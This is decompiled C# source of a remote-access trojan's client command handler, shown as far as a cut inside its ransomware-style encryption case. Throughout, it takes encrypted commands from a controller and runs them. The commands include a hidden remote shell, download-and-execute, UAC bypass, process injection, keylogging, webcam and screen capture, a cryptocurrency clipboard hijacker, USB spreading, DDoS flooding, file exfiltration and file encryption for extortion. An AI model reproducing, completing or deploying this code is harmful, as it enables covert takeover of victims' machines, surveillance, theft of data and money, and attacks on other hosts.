using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub;

public class Messages
{
	private delegate void AppendOutputTextDelegate(string text);

	private static readonly object SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);

	[AccessedThroughProperty("MyProcess")]
	private static Process _MyProcess;

	private static int processid;

	public static int ngrok;

	public static int RS;

	public static int KL;

	public static string KLP = Path.GetTempPath() + "XKlog.txt";

	public static IntPtr Handle;

	public static int CMS;

	private static Process MyProcess
	{
		get
		{
			return _MyProcess;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DataReceivedEventHandler value2 = MyProcess_OutputDataReceived;
			DataReceivedEventHandler value3 = MyProcess_ErrorDataReceived;
			if (_MyProcess != null)
			{
				_MyProcess.OutputDataReceived -= value2;
				_MyProcess.ErrorDataReceived -= value3;
			}
			_MyProcess = value;
			if (_MyProcess != null)
			{
				_MyProcess.OutputDataReceived += value2;
				_MyProcess.ErrorDataReceived += value3;
			}
		}
	}

	public static void AppendOutputText(string text)
	{
		try
		{
			new AppendOutputTextDelegate(AppendOutputText);
			ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"R/", SPL), (object)text)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\nError: " + e.Data + "\r\n");
	}

	private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		AppendOutputText("\r\n" + e.Data);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Read(byte[] b)
	{
		//IL_1196: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ad: Expected O, but got Unknown
		//IL_1dcd: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(SPL), -1, (CompareMethod)0);
				switch (array[0])
				{
				case "rec":
					Helper.CloseMutex();
					Application.Restart();
					Environment.Exit(0);
					break;
				case "CLOSE":
					ClientSocket.S.Shutdown(SocketShutdown.Both);
					ClientSocket.S.Close();
					Environment.Exit(0);
					break;
				case "uninstall":
				{
					object obj18 = Helper.objj(array[1]);
					object[] array2 = new object[2]
					{
						Settings.path2,
						Settings.nameee
					};
					object[] array69 = array2;
					bool[] array11 = new bool[2] { true, true };
					NewLateBinding.LateCall(obj18, (Type)null, "un", array69, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					if (array11[1])
					{
						Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
					}
					break;
				}
				case "update":
				{
					object obj8 = Helper.objj(array[1]);
					object[] array2 = new object[4]
					{
						Settings.path2,
						Settings.nameee,
						null,
						null
					};
					object[] array24 = array2;
					string[] array25 = array;
					string[] array26 = array25;
					int num3 = 2;
					array24[2] = array26[2];
					object[] array27 = array2;
					string[] array28 = array;
					string[] array29 = array28;
					int num4 = 3;
					array27[3] = array29[3];
					object[] array9 = array2;
					object[] array30 = array9;
					bool[] array11 = new bool[4] { true, true, true, true };
					NewLateBinding.LateCall(obj8, (Type)null, "update", array30, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					if (array11[1])
					{
						Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					if (array11[2])
					{
						array25[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[2]), typeof(string));
					}
					if (array11[3])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[3]), typeof(string));
					}
					break;
				}
				case "DW":
					Download(array[1], array[2]);
					break;
				case "RD-":
					ClientSocket.Send("RD-");
					break;
				case "RD+":
					RemoteDesktop.Capture(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
					break;
				case "FM":
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "Memory", new object[1] { RuntimeHelpers.GetObjectValue(Helper.frombase64(array[2])) }, (string[])null, (Type[])null, (bool[])null, true);
					});
					thread.Start();
					GC.Collect();
					break;
				}
				case "LN":
				{
					string fileName = Path.GetTempFileName() + "-" + array[1];
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[2], fileName);
					Process.Start(fileName);
					GC.Collect();
					break;
				}
				case "getinfo":
					ClientSocket.Send("getinfo");
					break;
				case "Xinfo":
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Xinfo", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "gett", new object[0], (string[])null, (Type[])null, (bool[])null))));
					break;
				case "url":
					Process.Start(array[1]);
					break;
				case "openhide":
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
					object[] array2 = new object[1];
					object[] array57 = array2;
					string[] array28 = array;
					string[] array58 = array28;
					int num4 = 1;
					array57[0] = array58[1];
					object[] array9 = array2;
					object[] array59 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(objectValue2, (Type)null, "navigate", array59, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					NewLateBinding.LateSet(objectValue2, (Type)null, "visible", new object[1] { 0 }, (string[])null, (Type[])null);
					break;
				}
				case "shellfuc":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					break;
				case "bot":
				{
					object obj11 = Helper.objj(array[1]);
					object[] array9 = new object[1] { Settings.path2 };
					object[] array43 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj11, (Type)null, "RunBotKiller", array43, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "admin":
				{
					object obj7 = Helper.objj(array[1]);
					object[] array9 = new object[1] { Settings.path2 };
					object[] array23 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj7, (Type)null, "uac", array23, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "bypss":
				{
					object obj5 = Helper.objj(array[1]);
					object[] array9 = new object[1] { Settings.path2 };
					object[] array17 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj5, (Type)null, "calluac", array17, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "script":
				{
					object obj22 = Helper.objj(array[1]);
					object[] array2 = new object[2];
					object[] array75 = array2;
					string[] array28 = array;
					string[] array76 = array28;
					int num4 = 2;
					array75[0] = array76[2];
					object[] array77 = array2;
					string[] array25 = array;
					string[] array78 = array25;
					int num3 = 3;
					array77[1] = array78[3];
					object[] array9 = array2;
					object[] array79 = array9;
					bool[] array11 = new bool[2] { true, true };
					NewLateBinding.LateCall(obj22, (Type)null, "exc", array79, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					if (array11[1])
					{
						array25[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					break;
				}
				case "DDosS":
					if (Operators.CompareString(Settings.dosstu, "!", false) != 0)
					{
						Settings.doshost = array[1];
						Settings.dosport = array[2];
						Settings.dostype = array[3];
						if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
						{
							Settings.dTimer2.Interval = 100.0;
						}
						if (Operators.CompareString(Settings.dostype, "TCP", false) == 0)
						{
							Settings.dTimer2.Interval = 1.0;
						}
						Settings.dTimer2.Start();
						Settings.dosstu = "!";
					}
					break;
				case "DDosT":
					Settings.dTimer2.Stop();
					Settings.dosstu = null;
					Settings.doshost = null;
					Settings.dosport = null;
					Settings.dostype = null;
					break;
				case "Cilpper":
				{
					Thread thread5 = new Thread((ThreadStart)delegate
					{
						object obj23 = Helper.objj(array[1]);
						object[] array80 = new object[2];
						string[] array81 = array;
						int num5 = 2;
						array80[0] = array81[2];
						string[] array82 = array;
						int num6 = 3;
						array80[1] = array82[3];
						object[] array83 = array80;
						bool[] array84 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj23, (Type)null, "Clipper", array83, (string[])null, (Type[])null, array84, true);
						if (array84[0])
						{
							array81[num5] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array83[0]), typeof(string));
						}
						if (array84[1])
						{
							array82[num6] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array83[1]), typeof(string));
						}
					});
					thread5.Start();
					GC.Collect();
					break;
				}
				case "PE":
				{
					Thread thread4 = new Thread((ThreadStart)delegate
					{
						object obj24 = Helper.objj(array[1]);
						object[] array85 = new object[2];
						string[] array86 = array;
						int num7 = 2;
						array85[0] = array86[2];
						array85[1] = RuntimeHelpers.GetObjectValue(Helper.frombase64(array[3]));
						object[] array87 = array85;
						bool[] array88 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj24, (Type)null, "injRun", array87, (string[])null, (Type[])null, array88, true);
						if (array88[0])
						{
							array86[num7] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array87[0]), typeof(string));
						}
					});
					thread4.Start();
					GC.Collect();
					break;
				}
				case "startusb":
				{
					if (Operators.CompareString(Settings.usbC, "1", false) == 0)
					{
						break;
					}
					Thread thread3 = new Thread((ThreadStart)delegate
					{
						object obj25 = Helper.objj(array[1]);
						object[] array89 = new object[2]
						{
							Settings.path2,
							Settings.nameee
						};
						bool[] array90 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj25, (Type)null, "startsp", array89, (string[])null, (Type[])null, array90, true);
						if (array90[0])
						{
							Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array89[0]), typeof(string));
						}
						if (array90[1])
						{
							Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array89[1]), typeof(string));
						}
					});
					thread3.Start();
					Settings.usbC = "1";
					GC.Collect();
					break;
				}
				case "vbb":
				{
					object obj14 = Helper.objj(array[1]);
					object[] array2 = new object[1];
					object[] array54 = array2;
					string[] array28 = array;
					string[] array55 = array28;
					int num4 = 2;
					array54[0] = array55[2];
					object[] array9 = array2;
					object[] array56 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj14, (Type)null, "Compiler", array56, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "PSleep":
				{
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "PreventSleep", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					});
					thread2.Start();
					GC.Collect();
					break;
				}
				case "xxx":
					ClientSocket.Send("xxx");
					break;
				case "R/":
					try
					{
						try
						{
							using Process process2 = new Process();
							process2.StartInfo.FileName = "taskkill.exe";
							process2.StartInfo.Arguments = " /pid " + Conversions.ToString(processid) + " /f";
							process2.StartInfo.UseShellExecute = false;
							process2.StartInfo.RedirectStandardError = false;
							process2.StartInfo.RedirectStandardOutput = false;
							process2.StartInfo.CreateNoWindow = true;
							process2.Start();
							process2.WaitForExit();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						MyProcess = new Process();
						ProcessStartInfo startInfo = MyProcess.StartInfo;
						startInfo.FileName = "CMD.EXE";
						startInfo.UseShellExecute = false;
						startInfo.CreateNoWindow = true;
						startInfo.RedirectStandardInput = true;
						startInfo.RedirectStandardOutput = true;
						startInfo.RedirectStandardError = true;
						startInfo = null;
						MyProcess.Start();
						processid = MyProcess.Id;
						MyProcess.BeginErrorReadLine();
						MyProcess.BeginOutputReadLine();
						AppendOutputText("Process Started at: " + MyProcess.StartTime);
						break;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						break;
					}
				case "runnnnnn":
					MyProcess.StandardInput.WriteLine(array[1]);
					MyProcess.StandardInput.Flush();
					break;
				case "closeshell":
					MyProcess.StandardInput.WriteLine("EXIT");
					MyProcess.StandardInput.Flush();
					MyProcess.Close();
					break;
				case "ppp":
					ClientSocket.Send("ppp");
					break;
				case "R#":
				{
					string text4 = null;
					Process[] processes = Process.GetProcesses();
					foreach (Process process in processes)
					{
						try
						{
							text4 = text4 + Path.GetFileNameWithoutExtension(process.ProcessName) + Path.GetExtension(process.MainModule!.FileName!.ToString()) + "|+++|" + Conversions.ToString(process.Id) + "|+++|" + process.MainModule!.FileName!.ToString() + "*+*";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R#", SPL), (object)text4), SPL), (object)Process.GetCurrentProcess().MainModule!.FileName!.ToString())));
					break;
				}
				case "kill":
					Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
					break;
				case "kD":
					Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
					Thread.Sleep(500);
					File.Delete(array[2]);
					break;
				case "RST":
					Process.GetProcessById(Conversions.ToInteger(array[1])).Kill();
					Thread.Sleep(500);
					Process.Start(array[2]);
					break;
				case "cbb":
					ClientSocket.Send("cbb");
					break;
				case "R$":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"R$", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetText", new object[0], (string[])null, (Type[])null, (bool[])null))));
					break;
				case "SETT":
				{
					object obj10 = Helper.objj(array[1]);
					object[] array2 = new object[1];
					object[] array40 = array2;
					string[] array28 = array;
					string[] array41 = array28;
					int num4 = 2;
					array40[0] = array41[2];
					object[] array9 = array2;
					object[] array42 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj10, (Type)null, "setText", array42, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "clss":
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "clearr", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "|||":
					ClientSocket.Send("|||");
					break;
				case "GetDrives":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)getDrives())));
					break;
				case "FileManager":
					try
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)getFolders(array[1])), (object)getFiles(array[1]))));
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FileManager", SPL), (object)"Error")));
						ProjectData.ClearProjectError();
						break;
					}
				case "Delete":
				{
					string text3 = array[1];
					if (Operators.CompareString(text3, "Folder", false) == 0)
					{
						Directory.Delete(array[2], recursive: true);
					}
					else if (Operators.CompareString(text3, "File", false) == 0)
					{
						File.Delete(array[2]);
					}
					break;
				}
				case "Execute":
					Process.Start(array[1]);
					break;
				case "Rename":
				{
					string text2 = array[1];
					if (Operators.CompareString(text2, "Folder", false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(array[2], array[3]);
					}
					else if (Operators.CompareString(text2, "File", false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(array[2], array[3]);
					}
					break;
				}
				case "tss":
				{
					string text = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(array[1]);
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"txtttt", SPL), (object)text), SPL), (object)array[1])));
					break;
				}
				case "sedit":
				{
					StreamWriter streamWriter = new StreamWriter(array[1], append: false);
					streamWriter.WriteLine(array[2]);
					streamWriter.Close();
					break;
				}
				case "viewimage":
				{
					byte[] input;
					try
					{
						input = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"viewimage", ClientSocket.SPL), (object)Helper.BS(compress((Bitmap)Image.FromFile(array[1]), Conversions.ToInteger(array[2]))))));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						break;
					}
					try
					{
						lock (ClientSocket.S)
						{
							using MemoryStream memoryStream = new MemoryStream();
							byte[] array12 = Helper.AES_Encryptor(input);
							byte[] array13 = Helper.SB(Conversions.ToString(array12.Length) + "\0");
							memoryStream.Write(array13, 0, array13.Length);
							memoryStream.Write(array12, 0, array12.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
							GC.Collect();
							break;
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ClientSocket.isConnected = false;
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "hidefolderfile":
					FileSystem.SetAttr(array[1], (FileAttribute)2);
					break;
				case "showfolderfile":
					FileSystem.SetAttr(array[1], (FileAttribute)0);
					break;
				case "creatnewfolder":
					((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(array[1]);
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				case "creatfile":
					File.Create(array[1]).Dispose();
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				case "downloadfile":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"downloadedfile", SPL), (object)Convert.ToBase64String(File.ReadAllBytes(array[1]))), SPL), (object)array[2]), SPL), (object)Helper.GetHash(Helper.ID()))));
					break;
				case "sendfileto":
					File.WriteAllBytes(array[1], Convert.FromBase64String(array[2]));
					GC.Collect();
					break;
				case "WL":
				{
					object obj21 = Helper.objj(array[1]);
					object[] array2 = new object[1];
					object[] array72 = array2;
					string[] array28 = array;
					string[] array73 = array28;
					int num4 = 2;
					array72[0] = array73[2];
					object[] array9 = array2;
					object[] array74 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj21, (Type)null, "WL", array74, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					break;
				}
				case "DelP":
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "del", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "7zIT":
					NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "install", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "7zzip":
					Interaction.Shell(Path.GetTempPath() + "7zip\\7z.exe" + array[1], (AppWinStyle)0, false, -1);
					break;
				case "CPP":
				{
					string[] array71 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
					foreach (object obj20 in array71)
					{
						try
						{
							if (File.Exists(Conversions.ToString(obj20)))
							{
								File.Copy(Conversions.ToString(obj20), array[2] + Path.GetFileName(Conversions.ToString(obj20)));
							}
							if (Directory.Exists(Conversions.ToString(obj20)))
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().CopyDirectory(Conversions.ToString(obj20), array[2] + Path.GetFileName(Conversions.ToString(obj20)), true);
							}
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				}
				case "CTT":
				{
					string[] array70 = Strings.Split(array[1], "|", -1, (CompareMethod)0);
					foreach (object obj19 in array70)
					{
						try
						{
							if (File.Exists(Conversions.ToString(obj19)))
							{
								File.Move(Conversions.ToString(obj19), array[2] + Path.GetFileName(Conversions.ToString(obj19)));
							}
							if (Directory.Exists(Conversions.ToString(obj19)))
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().MoveDirectory(Conversions.ToString(obj19), array[2] + Path.GetFileName(Conversions.ToString(obj19)), true);
							}
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							ProjectData.ClearProjectError();
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				}
				case "PRG":
					ClientSocket.Send("PRG");
					break;
				case "P@":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"P@", SPL), NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "InsProg", new object[0], (string[])null, (Type[])null, (bool[])null))));
					break;
				case "UNS":
					Interaction.Shell(array[1], (AppWinStyle)1, false, -1);
					break;
				case "RSS":
				{
					object obj17 = Helper.objj(array[1]);
					object[] array2 = new object[1];
					object[] array66 = array2;
					string[] array28 = array;
					string[] array67 = array28;
					int num4 = 2;
					array66[0] = array67[2];
					object[] array9 = array2;
					object[] array68 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj17, (Type)null, "Run", array68, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "ENC":
				{
					object obj16 = Helper.objj(array[1]);
					object[] array2 = new object[2]
					{
						Helper.GetHash(Helper.ID()),
						null
					};
					object[] array63 = array2;
					string[] array28 = array;
					string[] array64 = array28;
					int num4 = 2;
					array63[1] = array64[2];
					object[] array9 = array2;
					object[] array65 = array9;
					bool[] array11 = new bool[2] { false, true };
					NewLateBinding.LateCall(obj16, (Type)null, "ENC", array65, (string[])null, (Type[])null, array11, true);
					if (array11[1])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					GC.Collect();
					break;
				}
				case "DEC":
				{
					object obj15 = Helper.objj(array[1]);
					object[] array2 = new object[2]
					{
						Helper.GetHash(Helper.ID()),
						null
					};
					object[] array60 = array2;
					string[] array28 = array;
					string[] array61 = array28;
					int num4 = 2;
					array60[1] = array61[2];
					object[] array9 = array2;
					object[] array62 = array9;
					bool[] array11 = new bool[2] { false, true };
					NewLateBinding.LateCall(obj15, (Type)null, "DEC", array62, (string[])null, (Type[])null, array11, true);
					if (array11[1])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					GC.Collect();
					break;
				}
				case "WBCM":
					if (Cam())
					{
						ClientSocket.Send("WBCM");
					}
					break;
				case "Cam":
				{
					if (CMS == 1)
					{
						break;
					}
					CMS = 1;
					byte[] input2;
					try
					{
						input2 = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"Cam", ClientSocket.SPL), (object)Helper.BS(Shot(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]))))));
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						CMS = 0;
						ProjectData.ClearProjectError();
						break;
					}
					try
					{
						lock (ClientSocket.S)
						{
							using MemoryStream memoryStream2 = new MemoryStream();
							byte[] array52 = Helper.AES_Encryptor(input2);
							byte[] array53 = Helper.SB(Conversions.ToString(array52.Length) + "\0");
							memoryStream2.Write(array53, 0, array53.Length);
							memoryStream2.Write(array52, 0, array52.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream2.ToArray(), 0, (int)memoryStream2.Length, SocketFlags.None);
							CMS = 0;
							GC.Collect();
							break;
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ClientSocket.isConnected = false;
						CMS = 0;
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "KL":
					if (KL != 1)
					{
						NewLateBinding.LateCall(Helper.objj(array[1]), (Type)null, "logdf", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						KL = 1;
						GC.Collect();
						Application.Run();
					}
					break;
				case "KLdel":
					File.Delete(KLP);
					break;
				case "KLget":
					if (File.Exists(KLP))
					{
						ClientSocket.Send("KLget");
					}
					break;
				case "KLGET":
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"KLGET", SPL), (object)STOBS64(File.ReadAllText(KLP)))));
					break;
				case "ACT":
					ClientSocket.Send("ACT");
					break;
				case "ACTG":
				{
					object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Helper.objj(array[1]), (Type)null, "GetActiveWindows", new object[0], (string[])null, (Type[])null, (bool[])null));
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)objectValue).GetEnumerator();
						while (enumerator.MoveNext())
						{
							string text5 = Conversions.ToString(enumerator.Current);
							try
							{
								ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ACTG", SPL), (object)text5)));
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					GC.Collect();
					ClientSocket.Send("ENBC");
					break;
				}
				case "killAct":
				{
					object obj13 = Helper.objj(array[1]);
					object[] array2 = new object[1];
					object[] array49 = array2;
					string[] array28 = array;
					string[] array50 = array28;
					int num4 = 2;
					array49[0] = array50[2];
					object[] array9 = array2;
					object[] array51 = array9;
					bool[] array11 = new bool[1] { true };
					NewLateBinding.LateCall(obj13, (Type)null, "Kill", array51, (string[])null, (Type[])null, array11, true);
					if (array11[0])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
					}
					GC.Collect();
					ClientSocket.Send("Ref");
					break;
				}
				case "FURL":
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], array[2]);
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				case "msgg":
					MessageBox.Show(array[1]);
					break;
				case "UPtoS":
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(array[1], Settings.uploader);
					GC.Collect();
					Thread.Sleep(500);
					ClientSocket.Send("RL");
					break;
				case "FSG":
				{
					object obj12 = Helper.objj(array[1]);
					object[] array2 = new object[3]
					{
						Settings.uploader,
						null,
						null
					};
					object[] array44 = array2;
					string[] array28 = array;
					string[] array45 = array28;
					int num4 = 2;
					array44[1] = array45[2];
					object[] array46 = array2;
					string[] array25 = array;
					string[] array47 = array25;
					int num3 = 3;
					array46[2] = array47[3];
					object[] array9 = array2;
					object[] array48 = array9;
					bool[] array11 = new bool[3] { false, true, true };
					NewLateBinding.LateCall(obj12, (Type)null, "RUN", array48, (string[])null, (Type[])null, array11, true);
					if (array11[1])
					{
						array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
					}
					if (array11[2])
					{
						array25[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[2]), typeof(string));
					}
					GC.Collect();
					break;
				}
				case "RENC":
					if (RS != 1)
					{
						RS = 1;
						object obj9 = Helper.objj(array[1]);
						object[] array2 = new object[5]
						{
							Helper.GetHash(Helper.ID()),
							null,
							null,
							null,
							null
						};
						object[] array31 = array2;
						string[] array28 = array;
						string[] array32 = array28;
						int num4 = 2;
						array31[1] = array32[2];
						object[] array33 = array2;
						string[] array25 = array;
						string[] array34 = array25;
						int num3 = 3;
						array33[2] = array34[3];
						object[] array35 = array2;
						string[] array7 = array;
						string[] array36 = array7;
						int num2 = 4;
						array35[3] = array36[4];
						object[] array37 = array2;
						string[] array4 = array;
						string[] array38 = array4;
						int num = 5;
						array37[4] = array38[5];
						object[] array9 = array2;
						object[] array39 = array9;
						bool[] array11 = new bool[5] { false, true, true, true, true };
						NewLateBinding.LateCall(obj9, (Type)null, "ENC", array39, (string[])null, (Type[])null, array11, true);
						if (array11[1])
						{
							array28[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[1]), typeof(string));
						}
						if (array11[2])
						{
